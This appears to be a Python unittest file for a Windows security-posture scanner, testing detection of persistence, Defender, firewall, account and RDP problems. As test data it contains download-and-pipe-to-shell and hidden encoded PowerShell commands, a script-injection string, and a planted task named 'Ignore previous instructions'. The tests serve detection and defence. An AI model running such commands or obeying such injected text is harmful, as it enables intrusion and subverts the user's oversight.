"""Slice 2 tests: check catalog, planted-problem recall, clean-machine false
positives, and report safety. No real machine needed.

    python -m unittest test_slice2 -v
"""

import contextlib
import io
import json
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

import checks
import report
import runner
import scan
import snapshot
from test_slice1 import fake_run

NOW = datetime(2026, 11, 23, 12, 0, 0, tzinfo=timezone.utc)


def ok(name, data):
    return runner.RunResult(name, True, json.dumps(data))


def planted_snapshot(overrides=None):
    return snapshot.build_snapshot(fake_run(overrides), now=NOW)


# A machine with nothing wrong: only normal items, good settings, admin scan.
CLEAN = {
    "win_host_info": ok("win_host_info", [{"Hostname": "CLEANBOX", "User": "alice", "IsAdmin": True,
                                           "OsCaption": "Microsoft Windows 11 Pro", "OsVersion": "10.0.26100",
                                           "OsBuild": "26100"}]),
    "win_listen_tcp": ok("win_listen_tcp", [{"LocalAddress": "0.0.0.0", "LocalPort": 135, "OwningProcess": 10},
                                            {"LocalAddress": "127.0.0.1", "LocalPort": 5432, "OwningProcess": 20}]),
    "win_listen_udp": ok("win_listen_udp", []),
    "win_processes": ok("win_processes", [{"Id": 10, "ProcessName": "svchost", "Path": None},
                                          {"Id": 20, "ProcessName": "postgres",
                                           "Path": "C:\\Program Files\\PostgreSQL\\16\\bin\\postgres.exe"}]),
    "win_run_keys": ok("win_run_keys", [{"Key": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                         "Name": "SecurityHealth",
                                         "Value": "%windir%\\system32\\SecurityHealthSystray.exe"}]),
    "win_startup_folders": ok("win_startup_folders", [
        {"Folder": "C:\\Users\\alice\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
         "Name": "desktop.ini", "FullName": "x", "Length": 1, "LastWriteUtc": "2026-11-22T00:00:00.0000000Z"}]),
    "win_scheduled_tasks": ok("win_scheduled_tasks", [
        {"TaskPath": "\\Microsoft\\Windows\\Defrag\\", "TaskName": "ScheduledDefrag", "State": "Ready",
         "Author": "Microsoft", "UserId": "SYSTEM", "RunLevel": "Highest",
         "Execute": "%windir%\\system32\\defrag.exe", "Arguments": "-c -h", "ClassId": None},
        {"TaskPath": "\\Microsoft\\Windows\\Power\\", "TaskName": "Report", "State": "Ready",
         "Author": "Microsoft", "UserId": "SYSTEM", "RunLevel": "Highest",
         "Execute": "%windir%\\system32\\rundll32.exe", "Arguments": "powrprof.dll,Report", "ClassId": None}]),
    "win_auto_services": ok("win_auto_services", [
        {"Name": "WinDefend", "DisplayName": "Defender",
         "PathName": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe\"",
         "State": "Running", "StartName": "LocalSystem"},
        {"Name": "Dhcp", "DisplayName": "DHCP Client",
         "PathName": "C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted -p",
         "State": "Running", "StartName": "NT Authority\\LocalService"}]),
    "win_wmi_subscriptions": ok("win_wmi_subscriptions", [
        {"Kind": "consumer", "Class": "NTEventLogEventConsumer", "Name": "SCM Event Log Consumer",
         "CommandLine": None, "ScriptText": None, "Query": None}]),
    "win_defender": ok("win_defender", [{"AMRunningMode": "Normal", "AntivirusEnabled": True,
                                         "RealTimeProtectionEnabled": True, "IsTamperProtected": True,
                                         "SignatureAgeDays": 0, "ExclusionPath": [], "ExclusionProcess": [],
                                         "ExclusionExtension": []}]),
    "win_firewall_profiles": ok("win_firewall_profiles", [{"Name": n, "Enabled": "True"}
                                                          for n in ("Domain", "Private", "Public")]),
    "win_hotfixes": ok("win_hotfixes", [{"HotFixID": "KB1", "Description": "Security Update",
                                         "InstalledOn": "2026-11-12"}]),
    "win_local_admins": ok("win_local_admins", [{"Name": "CLEANBOX\\Administrator", "ObjectClass": "User",
                                                 "Source": "Local", "SID": "S-1-5-21-1-2-3-500"},
                                                {"Name": "CLEANBOX\\admin2", "ObjectClass": "User",
                                                 "Source": "Local", "SID": "S-1-5-21-1-2-3-1002"}]),
    "win_local_users": ok("win_local_users", [
        {"Name": "Administrator", "Enabled": False, "PasswordRequired": True, "SID": "S-1-5-21-1-2-3-500"},
        {"Name": "Guest", "Enabled": False, "PasswordRequired": False, "SID": "S-1-5-21-1-2-3-501"},
        {"Name": "alice", "Enabled": True, "PasswordRequired": True, "SID": "S-1-5-21-1-2-3-1001"},
        {"Name": "admin2", "Enabled": False, "PasswordRequired": True, "SID": "S-1-5-21-1-2-3-1002"}]),
    "win_rdp_settings": ok("win_rdp_settings", [{"DenyConnections": 1, "NlaRequired": 1, "Port": 3389}]),
    "win_bitlocker": ok("win_bitlocker", [{"MountPoint": "C:", "VolumeType": "OperatingSystem",
                                           "ProtectionStatus": "On", "EncryptionPercentage": 100}]),
}


def find(findings, check, subject_part=""):
    return [f for f in findings if f["check"] == check and subject_part.lower() in f["subject"].lower()]


class PlantedRecallTests(unittest.TestCase):
    """Every planted problem in fixtures/recorded is caught at the right severity."""

    EXPECTED = [
        ("PERSIST-SUSPICIOUS", "WinUpdateHelper", "high"),
        ("PERSIST-SUSPICIOUS", "Ignore previous instructions", "high"),
        ("PERSIST-SUSPICIOUS", "sync.vbs", "medium"),
        ("PERSIST-MULTI", "updater.exe", "high"),
        ("WMI-CONSUMER", "Updater", "high"),
        ("SVC-UNQUOTED-PATH", "AcmeBackup", "medium"),
        ("PORT-ATTACK-TOOL", "4444", "medium"),
        ("PORT-REMOTE-SERVICE", "3389", "medium"),
        ("DEF-TAMPER-OFF", "", "medium"),
        ("DEF-SIGNATURES-OLD", "12", "medium"),
        ("DEF-EXCLUSION", "path C:\\", "high"),
        ("DEF-EXCLUSION", "updater", "high"),
        ("DEF-EXCLUSION", ".vbs", "high"),
        ("DEF-EXCLUSION", "D:\\Builds", "low"),
        ("FW-PROFILE-OFF", "Public", "high"),
        ("PATCH-STALE", "", "high"),
        ("ACCT-GUEST-ENABLED", "", "high"),
        ("ACCT-EXTRA-ADMIN", "helpdesk", "low"),
        ("ACCT-PASSWORD-NOT-REQUIRED", "helpdesk", "low"),
        ("PERSIST-REVIEW", "RemoteHelperSvc", "low"),
        ("ACCT-DAILY-ADMIN", "testuser", "low"),
        ("RDP-ENABLED", "", "medium"),
        ("RDP-NLA-OFF", "", "high"),
        ("SCAN-NOT-ADMIN", "", "info"),
        ("BITLOCKER-OFF", "C:", "medium"),
    ]

    @classmethod
    def setUpClass(cls):
        cls.findings = checks.run_checks(planted_snapshot())

    def test_every_planted_problem_is_found(self):
        for check, part, sev in self.EXPECTED:
            with self.subTest(check=check, subject=part):
                hits = find(self.findings, check, part)
                self.assertTrue(hits, f"missed {check} {part!r}")
                self.assertEqual(hits[0]["severity"], sev)

    def test_normal_items_are_not_flagged(self):
        normal = ["SecurityHealth", "OneDrive", "ScheduledDefrag", "CreateObjectTask", "Dhcp",
                  "TermService", "SCM Event Log", "5432"]
        for f in self.findings:
            for n in normal:
                self.assertNotIn(n.lower(), f["subject"].lower(), f"{f['check']} flagged normal item {n}")

    def test_entries_of_a_backdoor_program_get_no_separate_low_review(self):
        # ChromeUpdateCheck and the 'Updater' WMI consumer both run updater.exe,
        # which PERSIST-MULTI already reports at high with both entries listed.
        self.assertEqual(find(self.findings, "PERSIST-REVIEW", "ChromeUpdateCheck"), [])
        self.assertEqual(find(self.findings, "PERSIST-REVIEW", "Updater"), [])
        self.assertEqual(len(find(self.findings, "PERSIST-REVIEW", "RemoteHelperSvc")), 1)

    def test_injection_named_task_is_still_high(self):
        hit = find(self.findings, "PERSIST-SUSPICIOUS", "Ignore previous instructions")[0]
        self.assertEqual(hit["severity"], "high")
        self.assertIn("pipes_into_shell", hit["traits"])

    def test_multi_mechanism_lists_every_place(self):
        hit = find(self.findings, "PERSIST-MULTI", "updater.exe")[0]
        sections = {u["section"] for u in hit["evidence"]["found_in"]}
        self.assertEqual(sections, {"scheduled_tasks", "wmi_subscriptions", "listening_ports"})

    def test_sorted_by_severity(self):
        ranks = [checks.SEVERITY_ORDER[f["severity"]] for f in self.findings]
        self.assertEqual(ranks, sorted(ranks))


class CleanMachineTests(unittest.TestCase):
    """False-positive guard: a healthy machine produces no findings at all."""

    def test_clean_machine_has_no_findings(self):
        findings = checks.run_checks(planted_snapshot(CLEAN))
        self.assertEqual([(f["check"], f["subject"]) for f in findings], [])


class TraitTests(unittest.TestCase):
    def test_encoded_hidden_powershell(self):
        t = checks.command_traits("powershell.exe -NoP -w hidden -enc SQBFAFgAIAAoAE4A")
        self.assertIn("encoded_powershell", t)
        self.assertIn("hidden_window", t)
        self.assertEqual(checks.severity_for(t), "high")

    def test_short_e_flag_counts_as_encoded(self):
        self.assertIn("encoded_powershell", checks.command_traits("pwsh -e SQBFAFgAIAAoAE4A"))

    def test_download_and_pipe(self):
        t = checks.command_traits("cmd /c curl https://x.invalid/p | cmd")
        self.assertEqual(set(t), {"downloads_from_internet", "pipes_into_shell"})

    def test_rundll32_alone_is_not_notable(self):
        self.assertEqual(checks.command_traits("C:\\Windows\\system32\\rundll32.exe shell32.dll,X"), [])

    def test_rundll32_from_user_folder_is_notable(self):
        t = checks.command_traits("rundll32.exe C:\\Users\\a\\AppData\\Local\\x.dll,Run")
        self.assertIn("rundll32_or_regsvr32", t)
        self.assertEqual(checks.severity_for(t), "medium")

    def test_microsoft_programdata_is_not_flagged(self):
        self.assertEqual(checks.command_traits("C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe"), [])
        self.assertEqual(checks.command_traits("C:\\ProgramData\\rh\\rhsvc.exe"), ["programdata_path"])

    def test_empty_command(self):
        self.assertEqual(checks.command_traits(None), [])
        self.assertIsNone(checks.severity_for([]))

    def test_executable_of(self):
        self.assertEqual(checks.executable_of('"C:\\Program Files\\A B\\a.exe" /x'), "c:\\program files\\a b\\a.exe")
        self.assertEqual(checks.executable_of("C:\\Program Files\\A B\\a.exe -s"), "c:\\program files\\a b\\a.exe")
        self.assertEqual(checks.executable_of("cmd.exe /c x"), "cmd.exe")
        self.assertEqual(checks.executable_of(""), "")


class WmiTests(unittest.TestCase):
    def _check(self, cls, command, name="X"):
        snap = planted_snapshot({"win_wmi_subscriptions": ok("win_wmi_subscriptions", [
            {"Kind": "consumer", "Class": cls, "Name": name, "CommandLine": command,
             "ScriptText": "x" if cls == "ActiveScriptEventConsumer" else None, "Query": None}])})
        return checks.check_wmi(snap)

    def test_program_files_command_is_low(self):
        f = self._check("CommandLineEventConsumer", "C:\\Program Files\\HP\\Fw\\HPFirmwareInstaller.exe -trigger")
        self.assertEqual((f[0]["check"], f[0]["severity"]), ("WMI-CONSUMER-REVIEW", "low"))

    def test_trusted_looking_name_does_not_help(self):
        f = self._check("CommandLineEventConsumer", "C:\\Users\\a\\AppData\\Local\\hp.exe", name="HP Dock Consumer")
        self.assertEqual(f[0]["severity"], "high")

    def test_suspicious_command_in_program_files_is_high(self):
        f = self._check("CommandLineEventConsumer", "C:\\Windows\\System32\\cmd.exe /c curl http://x.invalid | cmd")
        self.assertEqual(f[0]["severity"], "high")

    def test_script_consumer_is_always_high(self):
        f = self._check("ActiveScriptEventConsumer", None)
        self.assertEqual(f[0]["severity"], "high")


class OtherRuleTests(unittest.TestCase):
    def test_unquoted_path_rules(self):
        snap = planted_snapshot({"win_auto_services": ok("win_auto_services", [
            {"Name": "Quoted", "DisplayName": "", "PathName": "\"C:\\Program Files\\A B\\a.exe\"", "State": "", "StartName": ""},
            {"Name": "SvcHost", "DisplayName": "", "PathName": "C:\\WINDOWS\\system32\\svchost.exe -k x -p", "State": "", "StartName": ""},
            {"Name": "Bad", "DisplayName": "", "PathName": "C:\\Program Files\\A B\\a.exe", "State": "", "StartName": ""}])})
        self.assertEqual([f["subject"] for f in checks.check_unquoted_service_paths(snap)], ["Bad"])

    def test_unreadable_exclusions_are_info_not_clean(self):
        snap = planted_snapshot({"win_defender": ok("win_defender", [{
            "AMRunningMode": "Normal", "RealTimeProtectionEnabled": True, "IsTamperProtected": True,
            "SignatureAgeDays": 0, "ExclusionPath": ["N/A: Must be an administrator to view exclusions"],
            "ExclusionProcess": ["N/A: Must be an administrator to view exclusions"],
            "ExclusionExtension": ["N/A: Must be an administrator to view exclusions"]}])})
        found = [f["check"] for f in checks.check_defender(snap)]
        self.assertEqual(found, ["DEF-EXCLUSIONS-UNREADABLE"])

    def test_passive_defender_does_not_report_realtime_off(self):
        snap = planted_snapshot({"win_defender": ok("win_defender", [{
            "AMRunningMode": "Passive Mode", "RealTimeProtectionEnabled": False, "IsTamperProtected": True,
            "SignatureAgeDays": 0, "ExclusionPath": [], "ExclusionProcess": [], "ExclusionExtension": []}])})
        self.assertEqual([f["check"] for f in checks.check_defender(snap)], ["DEF-PASSIVE"])

    def test_realtime_off_is_high(self):
        snap = planted_snapshot({"win_defender": ok("win_defender", [{
            "AMRunningMode": "Normal", "RealTimeProtectionEnabled": False, "IsTamperProtected": True,
            "SignatureAgeDays": 0, "ExclusionPath": [], "ExclusionProcess": [], "ExclusionExtension": []}])})
        self.assertEqual([(f["check"], f["severity"]) for f in checks.check_defender(snap)],
                         [("DEF-REALTIME-OFF", "high")])

    def test_patch_thresholds(self):
        def age_finding(date):
            snap = planted_snapshot({"win_hotfixes": ok("win_hotfixes", [
                {"HotFixID": "KB1", "Description": "", "InstalledOn": date}])})
            return [(f["check"], f["severity"]) for f in checks.check_patching(snap)]
        self.assertEqual(age_finding("2026-11-01"), [])
        self.assertEqual(age_finding("2026-10-01"), [("PATCH-STALE", "medium")])
        self.assertEqual(age_finding("2026-08-01"), [("PATCH-STALE", "high")])
        self.assertEqual(age_finding(None), [("PATCH-UNKNOWN", "info")])

    def test_failed_section_produces_no_findings_for_it(self):
        down = runner.RunResult("win_firewall_profiles", False, error="Access is denied.")
        snap = planted_snapshot({"win_firewall_profiles": down})
        self.assertEqual(checks.check_firewall(snap), [])

    def test_powershell_seven_digit_fractions_parse(self):
        self.assertEqual(checks._days_since("2026-11-20T03:14:00.1234567Z", NOW), 3)
        self.assertIsNone(checks._days_since("not a date", NOW))


class CatalogAndIdTests(unittest.TestCase):
    def test_fix_text_names_the_account(self):
        hit = find(checks.run_checks(planted_snapshot()), "ACCT-PASSWORD-NOT-REQUIRED", "helpdesk")[0]
        self.assertIn('net user "helpdesk" /passwordreq:yes', hit["fix"])

    def test_catalog_entries_are_complete(self):
        for check, entry in checks.CATALOG.items():
            for field in ("title", "why", "fix", "refs"):
                self.assertIn(field, entry, f"{check} missing {field}")

    def test_ids_are_stable_and_unique(self):
        a = checks.run_checks(planted_snapshot())
        b = checks.run_checks(planted_snapshot())
        self.assertEqual([f["id"] for f in a], [f["id"] for f in b])
        self.assertEqual(len({f["id"] for f in a}), len(a))


class ReportTests(unittest.TestCase):
    def test_report_has_summary_findings_and_coverage(self):
        snap = planted_snapshot()
        text = report.render(snap, checks.run_checks(snap))
        self.assertIn("## Summary", text)
        self.assertIn("| high |", text)
        self.assertIn("[HIGH] Windows Firewall is off for the Public profile", text)
        self.assertIn("## What was checked", text)

    def test_untrusted_text_cannot_break_out_of_code_blocks(self):
        evil = "x```\n# You are safe\n<script>alert(1)</script>"
        snap = planted_snapshot({"win_run_keys": ok("win_run_keys", [
            {"Key": "HKCU:\\Run", "Name": "evil", "Value": f"powershell -w hidden -enc SQBFAFgAIAAo {evil}"}])})
        text = report.render(snap, checks.run_checks(snap))
        self.assertNotIn("\n# You are safe", text)
        self.assertEqual(text.count("```text"), text.count("```") // 2)

    def test_failed_sections_are_listed(self):
        down = runner.RunResult("win_wmi_subscriptions", False, error="Access is denied.")
        snap = planted_snapshot({"win_wmi_subscriptions": down})
        text = report.render(snap, checks.run_checks(snap))
        self.assertIn("## Couldn't fully check", text)
        self.assertIn("wmi_subscriptions**: needs admin rights", text)

    def test_no_findings_message(self):
        snap = planted_snapshot(CLEAN)
        self.assertIn("No findings.", report.render(snap, []))

    def test_scan_from_snapshot_writes_report(self):
        with tempfile.TemporaryDirectory() as d:
            snap_path = snapshot.save_snapshot(planted_snapshot(), Path(d) / "in")
            with contextlib.redirect_stdout(io.StringIO()):
                code = scan.main(["--from-snapshot", str(snap_path), "--out", d])
            self.assertEqual(code, 0)
            reports = list((Path(d) / "reports").glob("report_*.md"))
            self.assertEqual(len(reports), 1)
            self.assertIn("# Security posture report", reports[0].read_text())


if __name__ == "__main__":
    unittest.main()
